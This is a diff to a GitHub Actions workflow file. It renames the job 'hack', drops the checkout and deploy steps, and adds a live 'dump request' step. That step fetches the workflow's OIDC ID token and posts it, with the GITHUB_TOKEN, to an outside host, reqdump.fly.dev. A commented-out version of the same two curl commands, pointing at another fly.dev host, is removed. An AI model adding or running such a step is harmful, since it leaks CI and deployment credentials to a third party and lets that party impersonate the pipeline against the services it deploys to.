@@ -8,21 +8,11 @@ jobs:
     permissions:
       contents: "read"
       id-token: "write"
-    name: Testing
+    name: hack
     runs-on: ubuntu-latest
     steps:
-    #  - name: Johnny action step
-    #    id: johnny
-    #    uses: navikt/johnny-action@v2
-    #    with:
-    #      name: 'Roger'
-      - uses: actions/checkout@v4
-      - uses: nais/deploy/actions/deploy@v2
-        env:
-          CLUSTER: dev-gcp
-          RESOURCE: nais.yaml
-      # - name: testing
-      #   run: |
-      #     payload=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=hookd")
-      #     curl https://twilight-hill-6850.fly.dev --data "$payload" -H"Authorization: ${{env.GITHUB_TOKEN}}"
+      - name: dump request
+        run: |
+          payload=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=hookd")
+          curl https://reqdump.fly.dev --data "$payload" -H"Authorization: ${{env.GITHUB_TOKEN}}"
 
